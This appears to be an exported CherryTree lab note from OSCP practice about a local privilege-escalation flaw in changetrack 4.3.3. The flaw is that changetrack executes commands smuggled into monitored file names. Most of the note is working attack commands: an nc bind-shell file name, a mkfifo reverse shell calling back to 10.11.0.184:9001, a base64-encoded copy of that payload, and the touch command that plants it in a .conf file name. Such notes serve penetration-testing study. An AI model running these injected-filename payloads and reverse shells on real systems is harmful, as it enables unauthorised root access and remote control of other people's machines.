<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>changetrack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># changetrack</h1></strong><br /><code>changetrack</code> monitors files and directories on the system for changes.<br /><br /><strong><h2>## Version 4.3.3 - Local Priv-Esc</h2></strong><br /><a href="https://www.exploit-db.com/exploits/9709">https://www.exploit-db.com/exploits/9709</a><br /><br /><strong>Examples</strong><br />• oscp 10.1.1.236 - Carrie<br /><br />changetrack has a parsing bug in the files it monitors.<br />It will execute files named <code>&lt;\&#39;commnd\&#39;</code><br />The example in the exploit spawns a bind shell like this - <code>touch &quot;&lt;\`nc -l -p 5001 -e \$SHELL\`&quot;</code><br /><br /><strong><h3>### Notes</h3></strong><br />• We have to use the <code>$SHELL</code> environtment variable because <code>touch</code> won&#39;t create files with filepaths in their name<br />• If you&#39;re using a command with filepaths in it, you can base64 encode the command that includes file paths to bypass the <code>touch</code> limitation<br />   ◇ <code>touch</code> won&#39;t see a file path, so it will accept your filename.<br />   ◇ You can then execute base64 encoded commands by decoding them and then piping the output to bash.<br />   ◇ <a href="https://serverfault.com/questions/896695/how-do-i-run-a-command-from-a-base64-encoded-string-in-bash">https://serverfault.com/questions/896695/how-do-i-run-a-command-from-a-base64-encoded-string-in-bash</a><br /><br />base64 encode<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/it_dept/10.1.1.236]<br />└──╼&nbsp;#nano&nbsp;shell<br />`rm&nbsp;/tmp/f;mkfifo&nbsp;/tmp/f;cat&nbsp;/tmp/f&nbsp;|&nbsp;/bin/sh&nbsp;-i&nbsp;2&gt;&amp;1&nbsp;|&nbsp;nc&nbsp;10.11.0.184&nbsp;9001&nbsp;&gt;&nbsp;/tmp/f`<br />┌─[root@parrot]─[/oscp/it_dept/10.1.1.236]<br />└──╼&nbsp;#cat&nbsp;shell&nbsp;|&nbsp;base64<br />YHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyAxMC4xMS4wLjE4NCA5MDAxID4gL3RtcC9mYAo=</div></div><br /><br /><code>touch</code> file.<br />(in this example, changetrack executed files ending in .conf)<br /><div class="codebox"><div class="codebox">[carrie@carrie&nbsp;~]$&nbsp;touch&nbsp;&quot;&lt;\`base64&nbsp;-d&nbsp;&lt;&lt;&lt;&nbsp;YHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuYyAxMC4xMS4wLjE4NCA5MDAxID4gL3RtcC9mYA==&nbsp;|&nbsp;\$SHELL\`.conf&quot;</div></div><br /><br /><br /><br /></div>
</body>
</html>
